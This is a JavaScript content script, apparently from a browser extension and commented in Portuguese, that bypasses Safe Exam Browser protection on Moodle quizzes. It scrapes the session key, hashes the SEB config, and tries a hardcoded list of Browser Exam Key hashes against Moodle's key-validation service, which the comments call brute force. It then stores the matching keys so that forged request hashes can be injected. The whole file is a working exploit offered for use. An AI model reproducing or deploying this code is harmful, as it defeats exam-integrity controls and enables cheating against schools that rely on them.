
// Lista de chaves BEK para testar (Exemplos de hashes de binários comuns do SEB)
const browserExamKeys = [
    "04ce06ef92444813f0286f5a0a98333f24a6998b777ae295bb5077ca5f4ad9bb", // win 3.10.1
    "f9db9012bf27f1f04d0c1fef725f04bf13a2cd5c3ca47db2bf1ee0b234861ad0", // 3.6.1
    "14dea0f109dd1cdd438ab22d7534e92d4260c491fdd9e313b844e3b6eefb2fc0", // 3.6.0
    "bed48e0dc8b5373fa181f7b6d93e0462dbfa4bf464771341dfae209ef276a49b", // 3.5.4
    "6264b527096bd81b4303e62947736d07f5ee4a223554535fabfb0585eddd9af8", // 3.5.3
    "1c9781148b5eae29649047a6009e35e40f5cfb8da8a5eda0c8453237b11bc52c", // 3.5.1
];

async function sha256(message) {
    const msgBuffer = new TextEncoder().encode(message);
    const hashBuffer = await crypto.subtle.digest('SHA-256', msgBuffer);
    return Array.from(new Uint8Array(hashBuffer)).map(b => b.toString(16).padStart(2, '0')).join('');
}

async function main() {
    const urlParams = new URLSearchParams(window.location.search);
    const cmid = urlParams.get('id') | urlParams.get('cmid');
    if (!cmid) {
        console.error("NO cmid");
        return;
    }

    // Verifica se já temos bypass ativo no storage para não rodar à toa
    const stored = await chrome.storage.local.get("seb_bypass_data");
    if (stored.seb_bypass_data && stored.seb_bypass_data.cmid === cmid) {
        console.log("Bypass já configurado no Storage. O Background cuidará da injeção.");
        return;
    }

    // --- LÓGICA DE QUEBRA DE CHAVE (APENAS SE NÃO TIVER NO STORAGE) ---
    const sessKeyMatch = document.body.innerHTML.match(/sesskey=([^"]+)"/);
    const sessKey = sessKeyMatch ? sessKeyMatch[1] : null;

    if (!sessKey) {
        console.error("NO sesskey");
        return;
    }

    try {
        console.log("Iniciando varredura de chaves...");
        const sebUrl = `${window.location.origin}/mod/quiz/accessrule/seb/config.php?cmid=${cmid}`;
        const response = await fetch(sebUrl);
        const xmlText = await response.text();
        const simulatedConfigKey = await sha256(xmlText);

        let validBrowserKey = null;

        // Brute-force contra o Moodle
        for (const testKey of browserExamKeys) {
            const payload = [{
                index: 0,
                methodname: 'quizaccess_seb_validate_quiz_keys',
                args: {
                    cmid: parseInt(cmid),
                    url: `${window.location.origin}/mod/quiz/view.php?id=${cmid}`,
                    configkey: simulatedConfigKey,
                    browserexamkey: testKey
                }
            }];

            const res = await fetch(`${window.location.origin}/lib/ajax/service.php?sesskey=${sessKey}`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });

            const data = await res.json();
            if (data[0] && !data[0].error && data[0].data?.browserexamkey === true) {
                validBrowserKey = testKey;
                break;
            }
        }

        if (validBrowserKey) {
            // Calcular hashes finais
            const requestUrl = window.location.href;
            const requestHash = await sha256(requestUrl + validBrowserKey);
            const configKeyHash = await sha256(requestUrl + simulatedConfigKey);

            // SALVAR NO STORAGE (Isso dispara o listener no background)
            await chrome.storage.local.set({
                "seb_bypass_data": {
                    cmid: cmid,
                    configKey: simulatedConfigKey,
                    browserExamKey: validBrowserKey,
                    requestHash: requestHash,
                    configKeyHash: configKeyHash
                }
            });

            alert("Chave encontrada e salva no Storage! Recarregando...");
            window.location.reload();
        }

    } catch (e) {
        console.error("Erro na PoC:", e);
    }
}

// Pequeno delay para garantir carregamento do DOM
setTimeout(main, 1000);
